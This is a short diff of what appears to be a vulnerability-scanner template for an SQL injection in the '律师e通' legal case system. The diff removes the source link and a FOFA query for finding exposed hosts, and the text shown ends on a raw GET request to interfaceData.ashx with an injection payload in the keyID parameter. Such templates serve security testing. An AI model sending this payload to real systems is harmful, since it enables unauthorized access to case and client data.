@@ -3,12 +3,8 @@ info:
   name: 律师e通 interfaceData 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ib4guad0ixrdx3n9'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ib4guad0ixrdx3n9
-    fofa: title=="律师e通"
 http:
 - raw:
   - 'GET /caseprocess/jsonData/interfaceData.ashx?param=loadCaseInfo&keyID=''+or+1=user-- HTTP/1.1
